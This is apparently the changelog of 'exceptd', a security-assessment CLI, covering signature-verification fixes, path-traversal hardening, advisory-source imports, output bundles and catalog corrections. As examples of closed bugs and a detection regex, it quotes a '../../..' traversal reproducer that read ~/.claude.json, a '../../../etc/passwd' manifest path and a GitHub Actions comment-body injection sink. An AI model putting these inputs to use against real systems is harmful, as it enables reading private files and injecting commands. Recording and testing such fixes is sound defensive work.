### Trust chain (lib/refresh-network.js)

The `exceptd refresh --network` path was effectively unsigned-code-delivery. The signature loop iterated `sk.id` (not exposed on manifest entries) and a fixed payload path `skills/<id>/SKILL.md` (uppercase, while the manifest's path is `skills/<name>/skill.md` lowercase). Result: `0/38 signatures verified` across every operator pulling the network refresh. The `failures.length === 0` short-circuit then allowed `ok: true` to ship.

Now: manifest entries iterated by `name` + `path` + `signature`, mirroring `lib/verify.js`. CRLF + BOM normalization applied before verify — Windows-`core.autocrlf=true` contributors produce signatures that round-trip stably through the network refresh. Manifest paths validated with the same regex-and-resolve check the source-tree verifier uses. The swap also enforces that every `skills/*/skill.md` entry shipped in the tarball is declared in the manifest — a tarball-vs-manifest divergence now refuses the swap.

Integrity: SHA-512 SRI from `dist.integrity` is verified first (collision-resistant beyond SHA-1 reach), then SHA-1 `dist.shasum` for compatibility. `dist.signatures[]` count is now surfaced. A 200 MB tarball size cap (overridable via `EXCEPTD_TARBALL_SIZE_CAP_BYTES`) is enforced during download.

Atomic swap rewritten with two-phase semantics: backup-all-targets THEN install-all-targets, with reverse-walk rollback on mid-swap failure. Backup-dir suffix uses `${process.pid}-${randomBytes(4)}` so concurrent invocations don't collide on the millisecond clock.

### Engine semantics (lib/playbook-runner.js)

- `evidence_hash` now incorporates a canonicalized SHA-256 over the operator's submission (observations, signal_overrides, signals — sorted keys recursively). Previously it hashed only `(playbook, directive, matched_cves, rwep, classification)`, so two materially different submissions producing the same classification were indistinguishable; `reattest` couldn't detect drift. A `submission_digest` sibling field is also surfaced for downstream consumers.
- `run()` generates `session_id` once and threads it through close() and into CSAF tracking.id + OpenVEX @id + product PURLs. Previously close() and the bundle emitters each minted independent ids, so an attestation file at `.exceptd/attestations/<run-id>/attestation.json` couldn't be correlated to the bundle URN inside it.
- Indicator-level `cve_ref` is now load-bearing: when an indicator hits and declares a `cve_ref`, the catalog entry is pulled into `analyze.matched_cves[]` with `correlated_via: 'indicator_cve_ref:<id>'`. Previously the field was dead data — `library-author`'s `gha-workflow-script-injection-sink` had a `cve_ref: "MAL-2026-3083"` that never reached matched_cves.
- `analyzeFindingShape` now emits a derived `severity` from `rwep_adjusted` (critical >= 80, high >= 50, medium >= 20, low). Nine shipped playbooks reference `finding.severity` in `feeds_into` / `escalation_criteria`; those conditions were dead until now.
- RWEP `rwep_factor` semantics implemented. Previously the runner applied every weight whenever the named indicator hit — every kernel-LPE hit jumped to RWEP 100 regardless of whether the matched CVE was KEV-listed or had `active_exploitation: confirmed`. Each factor now scales by the first matched CVE's corresponding catalog attribute (`cisa_kev`, `active_exploitation` enum, `poc_available`, `ai_factor`, `patch_available`, etc.). Breakdown surfaces `weight_declared` + `factor_scale` + `weight_applied`.
- `blast_radius_score`: no signal → `null` (was: first rubric entry's score, which encoded "best case"); supplied → validated in `[0, 5]`; out-of-range → null + `blast_radius_signal: 'rejected'` + runtime_error.
- Corrupt `data/cve-catalog.json` no longer crashes the runner uncaught at require-time. `lib/cross-ref-api.js` catches JSON parse failures, records them in a `_loadErrors[]` array, and returns a degraded empty catalog. `run()` surfaces `{ok:false, blocked_by:'catalog_corrupt', error: ...}` instead of throwing.
- Unknown `directiveId` now returns `{ok:false, blocked_by:'directive_not_found', valid_directives:[...]}` instead of throwing inside analyze().
- VEX `fixed` / CycloneDX `resolved` no longer conflated with `not_affected`. Fixed CVEs are retained in `matched_cves` with a `vex_status: 'fixed'` annotation and excluded from driving RWEP base — operators tracking residual-risk for partially-deployed patches see them; the score doesn't double-count.
- `analyze.active_exploitation` reduces worst-of-N across matched CVEs (was first-match).
- `interpolate()` surfaces unresolved `${var}` placeholders as `<MISSING:var>` and emits `missing_interpolation_vars[]` on each notification record. Previously the literal `${var}` reached operator-facing regulator notification drafts.
- `signal_overrides` non-object input (string, array, number) rejected; previously a string `"HELLO"` spread character-by-character producing phantom indicator overrides.
- Unknown bundle format no longer leaks `analyze` + `validate` internals via a fallback `{format, note, analyze, validate}` — returns supported-formats list instead.
- `theater_verdict` validated against allowlist (`clear`, `present`, `theater`, `pending_agent_run`, `unknown`); off-allowlist values rejected with runtime_error.
- `jurisdiction_obligations` sorted by `window_hours` ascending so shortest-deadline obligations (DORA 4h) surface first.
- Non-day regression intervals (`wk`, `mo`, `yr`, `on_event`) now honored; previously only `\d+d` matched and 49 shipped triggers with `on_event` were silently dropped. `regression_event_triggers[]` + `regression_unparseable_triggers[]` surfaced.
- `precondition_check_source` provenance annotation: `'submission' | 'runOpts' | 'merged'` so operators reading attestations see whose precondition declarations the run actually used.
- `lockDir()` moved from `process.cwd()` to `os.tmpdir() + 'exceptd-locks-<platform>'` (overridable via `EXCEPTD_LOCK_DIR`) so cross-cwd invocations share lock state.

### Refresh upstream sources (lib/source-osv.js, lib/source-ghsa.js, lib/refresh-external.js)

GHSA + OSV `applyDiff` now route through `withCatalogLock` — previously they mutated `ctx.cveCatalog` in memory but never persisted. Bulk `--source ghsa|osv --apply` reported `applied: N updates` while the catalog file gained zero entries; under `--swarm`, KEV's lock-and-re-read overwrote the unflushed in-memory mutations. Lost-update bug closed.

`normalizeAdvisory` now defensively coerces non-string `published_at` / `published` / `modified` to null; iterates `vulnerabilities` / `affected` / `references` only when arrays; coerces GHSA `cvss.score` numerically; validates dates against ISO-8601 prefix + year-in-[1990, currentYear+1]. Garbage upstream values fall to null rather than throwing out of the import.

GHSA fixture envelope now rejects null / number / string roots; OSV `OSV_HOST_OVERRIDE` validates host + port. `isOsvId` + `fetchAdvisoryById` + `normalizeAdvisory` + `buildDiff` trim whitespace from operator-supplied identifiers. `pickCatalogKey` upper-cases non-CVE identifiers so mixed-case upstream doesn't produce duplicate catalog entries. CVSS v4-over-v3 fallback: when v4 wins version-order but `cvss4BaseScore` returns null, fall back to v3 score. GHSA `buildDiff` summary now discloses `ghsa_only_skipped` count.

### CLI (bin/exceptd.js)

- **Path traversal on attest read paths closed.** `attest show / export / verify / diff` and `reattest` now validate session-id against the same `^[A-Za-z0-9._-]{1,64}$` regex used on writes. Live reproducer `exceptd attest show '../../..'` (which dumped `~/.claude.json` and other home-dir JSON) no longer reads outside the attestation root.
- **`process.exit(1)` after stderr-write replaced with `process.exitCode = 1; return;`** in `emitError` and three sibling sites in `cmdRun` / `cmdCi`. Stderr drains under piped CI consumers.
- **`ai-run` now persists attestations** in both `--no-stream` and streaming modes. Previously the returned `session_id` couldn't be resolved by `attest show / verify / diff` or `reattest` because the persistence call was missing.
- **`attest list --playbook` honors multi-flag** (was: array-vs-scalar comparison silently returned `count: 0`). `--since` validated as parseable ISO-8601.
- `--evidence-dir` per-entry path-traversal guard hardened.

### Orchestrator + watch (orchestrator/)

- `bus.eventLog` is now a ring buffer (default cap 1000 entries; `EXCEPTD_EVENT_LOG_MAX_SIZE` env override). Previously unbounded: ~400 B/event monotonic growth — 462 MB at 1M events.
- `exceptd watch` now handles SIGTERM, SIGHUP, SIGBREAK in addition to SIGINT — container/k8s/systemd shutdown drains scheduler timers and releases the lockfile.
- Lockfile at `~/.exceptd/watch.lock` prevents two concurrent watch processes against the same store. Stale-lock check uses PID-liveness probe (`process.kill(pid, 0)`) plus 60s mtime fallback.
- Monthly + annual scheduler bootstrap now fires when overdue (was: only fired after 30/365 days of continuous uptime; weekly-restart watch processes never saw them). Last-fired state persisted at `~/.exceptd/scheduler-last-fired.json`.
- Scheduler bootstrap `runWeeklyCurrencyCheck()` call wrapped in try/catch matching the per-tick wrapper.
- `require('orchestrator/index')` no longer triggers full CLI execution — `main()` gated behind `if (require.main === module)`. Duplicate `case 'watch':` removed.
- `scanner.probeTls()` now honors `EXCEPTD_AIR_GAP=1` and uses `EXCEPTD_TLS_PROBE_TARGET` (default `registry.npmjs.org:443`) instead of hardcoded `google.com:443`.
- `scan --json` no longer emits `_deprecation` field (CLAUDE.md no-internal-narrative rule).
- `dispatch()` rejects non-array inputs (was: iterated a string char-by-char). `routeQuery('')` returns `[]` (was: matched all 38 skills via empty-substring short-circuit).
- `pipeline.buildHandoff` bounds-checks `stageIndex`; `currencyCheck` caches `manifest.json` reads with 60s TTL.
- Worker-pool `scriptPath` validator rejects Windows UNC + extended-path prefixes (`\\?\`, `\\.\`, `\\server`).
- New `--log-file <path>` on watch, `--concurrency N` on validate-cves, 50 MB cache-file cap on validateAllCvesPreferCache.

### Predeploy gates

- New `keys/EXPECTED_FINGERPRINT` pin: silent key rotation now fails the gate unless `KEYS_ROTATED=1` is explicitly set.
- New `manifest-snapshot.sha256` pin: manifest-snapshot integrity is now check-able instead of trusted blindly.
- `scripts/check-sbom-currency.js` now cross-checks `sbom.components[]` names + versions against `manifest.skills` and `vendor/blamejs/_PROVENANCE.json`. A renamed/version-bumped skill that didn't regenerate SBOM now fails the gate (was: count-only comparison).
- `scripts/check-test-coverage.js` (diff-coverage gate) tightened: identifier must appear inside an actual `test(`/`it(`/`describe(`/`assert(` call body in the same test file that has the matching `require()` — not just anywhere in the corpus. Default routing for unclassified files changed from `other → allowlisted` to `manual-review` so schema files / data catalogs / package.json drift surface in CI output.
- `scripts/verify-shipped-tarball.js` now re-`require()`s the extracted tarball's `lib/refresh-network.js` and re-parses the tarball with the shipped parser — `npm pack --offline` flag added. A regression in the parser that previously would have been invisible (gate only used the source-tree parser) now produces a structured divergence error.
- `lib/validate-cve-catalog.js` extends cross-ref resolution to walk `attack_refs`, `atlas_refs`, `d3fend_refs`, `framework_control_gaps` keys in addition to `cwe_refs`. New `--strict` flag mirrors `validate-playbooks.js` for v0.13.0 preview. All new findings emit as warnings to preserve patch-class.
- `lib/validate-indexes.js` refuses empty `source_hashes` table; rejects symlinked source entries (defense-in-depth).
- `lib/validate-catalog-meta.js` now applies the declared `freshness_policy.stale_after_days` (was: declared but never enforced). Warning by default; `--strict` promotes to error.
- Informational gates' WARN counts surface in the summary as `passed (N warnings)`.
- Two no-op offline gates (validate-cves / validate-rfcs with forced `--no-fail`) removed; total gates now 14 (was 16).
- New `scripts/validate-vendor-online.js` (opt-in) fetches each vendored file from upstream and verifies SHA-256 against `_PROVENANCE.json` pinned commit.

### Catalog data corrections

Nine CVE→catalog cross-ref breaks closed: missing CWE-669 + CWE-123 added; missing ATT&CK sub-techniques T1059.001/006/007 + T1078.001 added; CVE framework_control_gaps keys reconciled to the suffixed canonical names per v0.12.11 (`NIS2-Art21-patch-management`, `SOC2-CC6-logical-access`, `SOC2-CC9-vendor-management`); `ALL-MAJOR-FRAMEWORKS` stub removed; new `DORA-Art28` (ICT third-party risk monitoring) entry added.

15 ATLAS entries gained `last_verified` so freshness-decay logic can fire per-entry. `attack-techniques._meta.attack_version` changed from `"v17"` to `"17"` to match `manifest.json.attack_version`. `T0867`/`T1570` "Lateral Tool Transfer" duplicate disambiguated via `domain: ICS` vs `domain: Enterprise`.

`cwe-catalog.skills_referencing` contamination cleaned up: 16 entries that mixed skill dir names with playbook IDs split into `skills_referencing` + `playbooks_referencing`. CWE→CVE back-references symmetrized: CVE-2026-43500 ↔ CWE-787 and CVE-2025-53773 ↔ CWE-77.

`exploit-availability.json` extended with the 4 newest CVEs (CVE-2026-45321, MAL-2026-3083, CVE-2026-42208, CVE-2026-39884).

### Skill content corrections (operator-facing factual drift)

- **ATLAS TTP names corrected across 14 skills.** AML.T0054 was systematically mislabeled "Craft Adversarial Data — NLP" (it's "LLM Jailbreak"). AML.T0017 mislabeled "Develop Capabilities" (it's "Discover ML Model Ontology"). AML.T0016 mislabeled "Acquire Public ML Artifacts" (it's "Obtain Capabilities: Develop Capabilities"). AML.T0000 (non-existent) replaced with the actual reconnaissance tactic AML.TA0002.
- **CVE-2026-30615 (Windsurf MCP) re-aligned with catalog correction.** 17 skills cited CVSS 9.8 / "zero-interaction RCE"; catalog v0.12.9 correction documents CVSS 8.0 / AV:L / local-vector RCE requiring attacker-controlled HTML. Skill bodies and the exploit-scoring pedagogical example reframed accordingly.
- **CVE-2025-53773 (GitHub Copilot) re-aligned** across 11 skills: cited 9.6 / RWEP 42 (or 91), catalog says 7.8 / RWEP 30.
- **CVE-2026-31431 KEV date corrected** across 5 skills: cited 2026-03-15, catalog says 2026-05-01. Compliance-theater pedagogical "30 days exposed" narrative recomputed to "13 days exposed" against today's date.
- **ATT&CK v17 pin propagated** to incident-response-playbook, pqc-first, skill-update-loop (was citing v15.1 / v15 / v16). Spurious "AGENTS.md rule #12" reference corrected to "rule #8".
- **Four newest catalog CVEs cited in appropriate skills**: MAL-2026-3083 (mlops-security, zeroday-gap-learn), CVE-2026-42208 (ai-attack-surface, ai-c2-detection, rag-pipeline-security, dlp-gap-analysis), CVE-2026-39884 (mcp-agent-trust), CVE-2026-45321 (zeroday-gap-learn, ai-attack-surface, supply-chain-integrity).
- **Defensive Countermeasure Mapping section added** to kernel-lpe-triage, researcher, skill-update-loop (previously missing despite `last_threat_review >= 2026-05-11`).

### Repository

- `package.json files` allowlist extended with `keys/EXPECTED_FINGERPRINT` and `manifest-snapshot.sha256` so the new pin checks ship to operators.
- `vendor/blamejs/_PROVENANCE.json` `exceptd_deltas` documents the worker-pool UNC-path Windows rejection.

Test count: 586 → 693 (+107: refresh-network rewrite tests, engine non-engine fixes, orchestrator audit tests, source-osv + source-ghsa hardening, predeploy gate additions, validate-cve-catalog cross-ref tests). Predeploy gates: 14/14 (was 16; two no-op offline gates removed). Skills: 38/38 signed and verified.

## 0.12.13 — 2026-05-14

**Patch: e2e scenarios pass `--ack` to exercise the v0.12.12 jurisdiction-clock contract.**

Two e2e scenarios (`02-tanstack-worm-payload`, `09-secrets-aws-key`) assert that `phases.close.jurisdiction_clocks_count >= 1` against a `detected` classification. The v0.12.12 contract: `clock_starts: detect_confirmed` no longer auto-stamps when classification turns `detected`; the operator must pass `--ack` for the clock to start. Both scenarios now pass `--ack`.

Test count: 585/585. Predeploy gates: 16/16. Skills: 38/38 signed and verified.

## 0.12.12 — 2026-05-13

**Patch: deep multi-surface hardening — engine semantics, concurrency, signing round-trip, output bundles, validators, scheduler, curation. 73 distinct fixes across 10 surface classes.**

### Engine semantics

`lib/playbook-runner.js` corrects several long-standing classification and clock bugs:

- **False-positive checks now gate classification.** When an indicator's `signal_overrides` says `hit` but the indicator's `false_positive_checks_required[]` haven't been attested, the verdict downgrades to `inconclusive` and `fp_checks_unsatisfied[]` is surfaced on the indicator. Operators attest FP checks with `signal_overrides: { '<id>__fp_checks': { '<check>': true } }`. Before: submitting a hit without attesting FP checks would auto-stamp `classification: detected`.
- **Dead branch on empty submission**: the indicator-default arm previously emitted `inconclusive` for both `anyCaptured` and the empty case. Empty submissions with no captured artifacts now correctly produce `classification: not_detected` with theater verdict `clear`.
- **`evalCondition` regex no longer crashes the run.** A malformed indicator condition (operator-authored regex) used to throw out of `analyze()`. Now wrapped in try/catch; the failure surfaces as `analyze.runtime_errors[]` with the source condition + exception message.
- **`--strict-preconditions` is now load-bearing.** The flag escalates `precondition_unverified` / `precondition_warn` / `precondition_skip` outcomes to halt, with `escalated_from` provenance. The CLI exit body now carries `strict_preconditions_violated[]` so consumers grep'ing the JSON see the contract reason without inspecting stderr.
- **`on_fail: skip_phase` is actually honored.** A precondition that fails `on_fail: skip_phase` now emits a placeholder detect phase `{skipped: true, classification: 'skipped', reason: <id>}` and runs analyze with empty signals. Previously the runner ignored the directive and proceeded into detect as if the precondition had passed.
- **`clock_starts: detect_confirmed` is bound to operator awareness.** Jurisdiction notification clocks (NIS2 24h, DORA 4h, GDPR 72h, etc.) no longer auto-stamp when classification turns `detected`; the operator must pass `--ack` for the clock to start. Without `--ack`, the notification entry carries `clock_pending_ack: true`. Matches the legal contract — the clock starts from operator awareness, not from the runner's decision.
- **`analyze.active_exploitation` is now the worst across matched CVEs**, not the first. Two matched CVEs where #1 is `suspected` and #2 is `confirmed` correctly report `confirmed`.
- **`signal_overrides` collisions are surfaced** rather than silently last-wins. Two observations targeting the same indicator id now record the discarded values in `analyze.signal_origins_with_collisions[]`.
- **Per-run playbook cache**: the runner reads the playbook once per `run()` invocation instead of re-loading it inside each of the seven phase calls.

### Scoring

`lib/scoring.js` exports a new `validateFactors(factors)` returning structured warnings for missing fields, out-of-range `blast_radius`, or non-enum `active_exploitation`. `scoreCustom(factors, {collectWarnings: true})` returns the score plus `_scoring_warnings[]` for downstream consumers; the bare-number return is preserved for backwards compatibility.

### Concurrency

Catalog read-modify-write was racy under concurrent `refresh --advisory --apply` invocations — five sites in `lib/refresh-external.js` and two in `lib/prefetch.js`. Now serialized via `withCatalogLock` / `withIndexLock` (lockfile-gated, atomic tmp+rename writes; 30s stale-lock reaper for crash recovery). Concurrent applies to distinct CVEs now both survive in the final catalog rather than 1/20 trials losing an entry to interleaved writes. Same pattern applied to the prefetch `_index.json`.

`persistAttestation` (in `bin/exceptd.js`) no longer has a TOCTOU window between `existsSync` and `writeFileSync` — atomic create via `flag: 'wx'` (`O_EXCL`) guarantees that two concurrent runs sharing a session-id produce one winner and one explicit `EEXIST` rather than silent last-write-wins.

`lib/refresh-external.js` post-pool `process.exit()` calls replaced with `process.exitCode = N; return;` so buffered stdout drains before the event loop ends (same v0.11.10 class).

### Signing round-trip

`lib/sign.js` + `lib/verify.js` now normalize content (strip UTF-8 BOM, convert CRLF → LF) before computing or verifying signatures. A skill body cloned with `core.autocrlf=true` on Windows but signed on Linux CI no longer fails verification on the consumer side. Byte-level proof: all four variants of `hello\nworld\n` (LF, CRLF, BOM+LF, BOM+CRLF) normalize to the identical signature.

Manifest schema validation lands in `lib/schemas/manifest.schema.json` + `loadManifestValidated()`. A tampered manifest with `path: "../../../etc/passwd"` is rejected at load time before any skill resolution. Per-skill paths must match `^skills/[A-Za-z0-9._/-]+/skill\.md$`.

`lib/lint-skills.js` rejects duplicate frontmatter keys (last-wins parsing previously masked identity spoofing) and walks `skills/` for orphan `skill.md` files not referenced in the manifest.

The fingerprint banner now prints AFTER the verdict line in both `sign-all` and `verify`, so a quick read of `gh run watch` output isn't ambiguous about pass/fail.

### Path traversal hardening

- `--session-id` now enforces `^[A-Za-z0-9._-]{1,64}$` (alphanumeric, dot, underscore, hyphen; up to 64 chars). Path separators and `..` are rejected at input.
- `--attestation-root` rejects `..`-bearing relative paths and resolves to an absolute path before propagation.
- `--evidence-dir` validates each `<id>.json` entry, refuses traversal-escaping resolved paths.
- `--evidence` enforces a 32 MB file-size limit to defend against adversarial JSON bombs.
- `persistAttestation` validates the session-id + filename and confirms the resolved directory stays under the attestation root.
- `parseTar` in `lib/refresh-network.js` skips entries with `..` segments or absolute paths — defense-in-depth against a compromised registry CDN shipping path-traversal tarballs.

### Output bundles (CSAF 2.0 / SARIF 2.1.0 / OpenVEX 0.2.0)

`buildEvidenceBundle()` in `lib/playbook-runner.js` produces bundles that pass canonical-schema validation against each spec:

- **CSAF**: `csaf_security_advisory` documents now include a populated `product_tree.full_product_names[]`; every `vulnerabilities[]` entry references a declared product via `product_status` (`known_affected` / `fixed` / `under_investigation`). NVD / Red Hat / ENISA CSAF dashboards previously rejected exceptd CSAF output for missing product_tree.
- **SARIF**: indicator-hit results now populate `physicalLocation.artifactLocation.uri` from the playbook's look-phase artifact source paths so GitHub Code Scanning surfaces them. Null property-bag keys are pruned. Framework-gap results carry `kind: "informational"` per spec §3.27.9.
- **OpenVEX**: every statement carries `products` (B1). Status semantics rebuilt — indicator hits become `affected` with an `action_statement` from the validate phase's selected remediation; misses become `not_affected` with `vulnerable_code_not_present` justification; inconclusive stays `under_investigation` (no action_statement). Framework-gap statements are removed from the VEX feed entirely (they're control-design observations, not vulnerabilities — they remain in CSAF and SARIF). Vulnerability `@id` values now follow RFC 8141 (`urn:cve:<id>`, `urn:exceptd:indicator:<playbook>:<id>`), replacing the unregistered `exceptd:` scheme.

### Validators

`lib/validate-playbooks.js` is a new validator that checks all 13 shipped playbooks against `lib/schemas/playbook.schema.json` plus cross-catalog references (`atlas_refs`, `cve_refs`, `cwe_refs`, `d3fend_refs`, `attack_refs`), internal consistency (duplicate indicator ids, RWEP threshold ordering, obligation_ref resolution), and feeds_into / mutex / skill_chain resolution. Wired as predeploy gate 16 (informational in v0.12.12; flips to enforcing in v0.13.0). 75-entry `data/attack-techniques.json` lands to support `attack_refs` resolution across skills and playbooks.

`lib/validate-cve-catalog.js` adds warning-class checks for the Hard Rule #14 iocs-when-poc-and-exploit-url contract, `atlas_refs` + `cwe_refs` cross-catalog resolution, duplicate-name detection, impossible-date guards, and strict CVSS-version prefix recognition. All new findings emit as warnings in v0.12.12 to preserve patch-class compatibility; v0.13.0 will flip them to errors.

`lib/lint-skills.js` extends section detection to require an anchored `^## <Section>` heading with ≥20 words of body text (warning-class), resolves `attack_refs` against `data/attack-techniques.json`, and flags missing "Defensive Countermeasure Mapping" sections on skills whose `last_threat_review >= 2026-05-11`.

### Curation `--apply`

`lib/cve-curation.js` gains the missing apply path. `curate(cveId, {apply: true, answers})` validates each answer against a per-field whitelist, applies, derives `rwep_score` from `rwep_factors` when an explicit score isn't supplied, computes `residual_warnings[]` against the required-schema set, and promotes the draft (strips `_auto_imported` + `_draft` + `_draft_reason`) when zero warnings remain. CLI surface: `exceptd refresh --curate <id> --answers <file>` or the explicit `--apply` alias. The questionnaire now always asks for `cvss_score`, `cvss_vector`, patch fields, `affected_versions`, and `cisa_kev` when those are unpopulated — without these, the apply path can't produce a schema-passing entry. Severity rendering for `cvss_score: null` returns `unrated` (was misleading `low`). Catalog reads honor absolute paths on Windows. OSV-imported drafts now show `"OSV: <id>"` in `auto_imported_from` (was always `"unknown"`).

### Scheduler

`orchestrator/scheduler.js` `MONTHLY_CVE_VALIDATION` (2.59 billion ms) and `ANNUAL_AUDIT` (31.5 billion ms) exceeded Node's INT32 setTimeout limit (2.15 billion ms), which silently clamps to 1 ms — producing a 1000 fires/sec stdout flood on idle `exceptd watch`. New `scheduleEvery(intervalMs, handler)` primitive uses a bounded `setInterval` (capped at 24 h) with wall-clock elapsed comparison. Idle watch goes from 1000 lines/sec to 0.

### Predeploy

`scripts/predeploy.js` now reports per-gate timing (`(NNN ms)` next to each pass / fail / informational line + the summary table). New 16th gate `Validate playbooks` runs informationally in v0.12.12.

### Repository

- `.github/workflows/ci.yml` gains a `validate-playbooks` job (`continue-on-error: true` in v0.12.12).
- `manifest-snapshot.json` + `sbom.cdx.json` + `data/_indexes/` refreshed.
- `data/attack-techniques.json` new — 75 ATT&CK technique entries with v17 metadata, supporting `attack_refs` resolution across the catalog.

Test count: 492 → 573 (+81 across engine, sign/verify, refresh-external, prefetch, scheduler, cve-curation, bundle-correctness, validate-playbooks, and operator-bugs test files). Predeploy gates: 16/16. Skills: 38/38 signed and verified.

## 0.12.11 — 2026-05-13

**Patch: OSV source hardening, indicator regex widening, CWE/framework-gap reconciliation.**

### OSV source hardening

`lib/source-osv.js` matures from greenfield to GHSA-parity:

- **Structured fixture-I/O error envelope.** Missing or malformed `EXCEPTD_OSV_FIXTURE` paths no longer crash with a Node stack trace; the source returns `{ok:false, error, source:"offline"}` matching the GHSA convention. Operators piping the CLI through `jq` or scripting around exit codes get a structured failure they can branch on.
- **Case-fold ids before lookup.** `fetchAdvisoryById("mal-2026-3083")` (lowercase) now resolves correctly. OSV.dev's `/v1/vulns/{id}` is case-sensitive — the source uppercases the id at entry before any branch on fixture lookup or network call.
- **Highest-CVSS-version wins + compute from vector.** `extractCvss` previously overwrote the chosen vector on every loop iteration ("last wins" not "highest-version wins") and returned `null` `score` when the OSV record carried only a vector string with no embedded numeric tail. Both fixed: explicit version-comparison via the `CVSS:N.M` prefix, and a new `cvss3BaseScore(vector)` helper that computes the CVSS 3.1 base score per FIRST §7.1 (handles Scope:U + Scope:C). MAL-* records that previously normalized to `cvss_score: null` / `active_exploitation: "unknown"` now carry computed scores.
- **GHSA-404 → OSV fallback for CVE-*.** `seedSingleAdvisory` previously routed `CVE-*` unconditionally through `source-ghsa`. When GHSA returned 404 for a CVE that had only PYSEC / RUSTSEC / SNYK / MAL coverage, the operator saw `GHSA returned HTTP 404` even though OSV had the record. Now: on GHSA-404 for a CVE-* id, retry via `source-osv.fetchAdvisoryById(id)`; surface the combined error when both 404.
- **`epss_note` on non-CVE drafts.** Non-CVE catalog keys (MAL-*, SNYK-*, RUSTSEC-*, etc.) now carry a populated `epss_note` documenting the FIRST EPSS API limitation — drafts no longer look incomplete to downstream consumers grepping for the field.
- **`verification_sources` deduped.** The canonical `osv.dev/vulnerability/<id>` URL was previously both prepended unconditionally AND pulled from `rec.references[]`. Deduped via `new Set` before return.
- **`buildDiff` error categorization.** Returns `unreachable_count` + `normalize_error_count` separately so an operator can distinguish "OSV unreachable" from "10 ids returned but none normalized cleanly."
- **`GHSA-` dropped from `OSV_ID_PREFIXES`.** The export previously listed GHSA-* even though the dispatcher unconditionally routes GHSA-* through `source-ghsa`. `isOsvId("GHSA-...")` now returns false. A top-of-file comment documents the routing decision (GHSA has richer field coverage for that namespace).
- **`OSV_HOST_OVERRIDE` env var for offline HTTP testing.** New stubbing surface — lets `tests/source-osv.test.js` spin up a local HTTP server to exercise HTTP 500 / 429 / timeout / parse-error paths previously uncovered. 429 surfaces as `rate-limited`; timeout error message clarified.
- **`seedSingleAdvisory` exported** for in-process testing.

### Indicator regex widening

`gha-workflow-script-injection-sink` (added v0.12.10) previously anchored on `run:\s*\|` (block-scalar pipe only). Single-line `run: echo "${{ github.event.comment.body }}"` bypassed the regex despite being the same vulnerability class. Widened to `run:[\s\S]*?...` which admits both block-scalar AND single-line forms. The indicator's `confidence` drops from `deterministic` → `high` and `deterministic` flag flips to `false` to reflect the reasoning step still required for the false-positive demotion (sandboxed `pull_request` + `contents: read` permissions). `tests/gha-workflow-script-injection-sink.test.js` lands as a new end-to-end regex test with 8 fixture YAML cases covering both the catch and the FP-demotion classes. All 5 of this repo's own `.github/workflows/*.yml` files remain clean against the widened regex.

### CWE reverse-references

The v0.12.10 catalog additions cited existing CWEs (CWE-89, CWE-77, CWE-94) without updating their reverse-reference `evidence_cves` arrays. Bidirectional linkage restored: CWE-89 now lists CVE-2026-42208 (LiteLLM SQLi), CWE-77 lists MAL-2026-3083 (elementary-data secondary classification), CWE-94 adds MAL-2026-3083 alongside the existing CVE-2025-53773 and CVE-2026-30615.

### Framework-control-gaps key reconciliation

Eight `framework_control_gaps` keys used by the v0.12.10 catalog additions did not resolve in `data/framework-control-gaps.json`. Six reconciled to canonical existing forms: `SLSA-L3` → `SLSA-v1.0-Build-L3`; `OWASP-LLM01` → `OWASP-LLM-Top-10-2025-LLM01`; `NIST-800-218-PO.4` → `NIST-800-218-SSDF`; `NIS2-Art21-2d` / `-2g` → `NIS2-Art21-patch-management`; `NIS2-Art21-2e` → `NIS2-Art21-incident-handling`. Two genuinely-distinct citations gained new entries in the framework-gaps catalog: `EU-CRA-Art13` (essential cybersecurity requirements + technical documentation; the elementary-data class of supply-chain compromise where the maintainer is a victim) and `NIST-800-53-SI-10` (information input validation; the trust-boundary-vs-inside-boundary distinction that argument-injection / SQL-injection / prompt-injection exploit). All `framework_control_gaps` references in the catalog now resolve to a real entry.

### Repository

- `lib/source-ghsa.js` "unrecognized id format" error message widened to enumerate the OSV-native prefixes operators can pass via `--advisory` (was previously CVE/GHSA only).
- `README.md` documents the OSV source: install command, `--advisory MAL-...` form, `EXCEPTD_OSV_FIXTURE` env var, the fresh-disclosure workflow expanded to mention OSV's coverage breadth.

Test count: 462 → 492 (+30: 18 OSV source-hardening tests + 10 indicator regex tests + 2 catalog drift assertions). Predeploy gates: 15/15. Skills: 38/38 signed and verified.

## 0.12.10 — 2026-05-13

**Patch: OSV.dev wired as an upstream source, three new catalog entries, one new library-author indicator.**

### OSV.dev as a new upstream source

`lib/source-osv.js` + `OSV_SOURCE` in `lib/refresh-external.js` add OSV.dev (https://api.osv.dev/) as a recognised upstream pull. Operators run `exceptd refresh --source osv` to import advisories from the OSV-aggregated dataset, which covers the OSSF Malicious Packages namespace (`MAL-*`), Snyk advisories (`SNYK-*`), GitHub Advisory Database (`GHSA-*`), RustSec (`RUSTSEC-*`), Mageia (`MGASA-*`), Go Vuln DB (`GO-*`), Ubuntu USN (`USN-*`), PYSEC, and UVI — one unauthenticated API in place of N per-vendor feeds.

The `--advisory <id>` flag now routes non-CVE / non-GHSA identifiers (`MAL-*`, `SNYK-*`, `RUSTSEC-*`, `USN-*`, `UVI-*`, `GO-*`, `MGASA-*`, `PYSEC-*`) through `source-osv`. CVE-* and GHSA-* continue routing through `source-ghsa` because the GitHub Advisory Database carries richer field coverage for those namespaces. Imported entries land as `_auto_imported: true` / `_draft: true` drafts, the same shape GHSA imports use — editorial fields (framework_control_gaps, full iocs, atlas_refs, attack_refs, rwep_factors) remain null until a human or AI assistant runs the cve-curation skill.

When an OSV record carries a `CVE-*` value in its `aliases`, the catalog key is the CVE form and the OSV identifier moves to an `aliases` array on the entry. When no CVE is assigned (e.g. MAL-* malicious-package compromises), the OSV identifier IS the catalog key. The previous identifier convention (CVE-only keys) is preserved as the default; the new identifier shapes are an extension.

Fixture support: `EXCEPTD_OSV_FIXTURE` env var (path to a JSON file with one or many OSV records) enables offline testing — same convention as the existing `EXCEPTD_GHSA_FIXTURE`.

### Three new catalog entries

